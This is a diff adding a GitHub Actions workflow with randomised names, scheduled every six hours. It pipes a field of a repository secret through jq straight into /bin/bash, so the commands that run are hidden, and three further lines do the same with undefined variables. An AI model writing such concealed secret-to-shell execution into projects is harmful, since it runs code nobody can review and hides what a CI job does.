@@ -1,0 +1,20 @@
+name: huanfangchinian
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huanfangchinian
+        env:
+          kvh600: ${{ secrets.kvh600 }}
+        run: |
+          echo $kvh600 | jq -r .zkw907 | /bin/bash
+          echo $nfp4485 | jq -r .h7 | /bin/bash
+          echo $wpesp3 | jq -r .wog799 | /bin/bash
+          echo $bp6197 | jq -r .kkpx93957 | /bin/bash
+
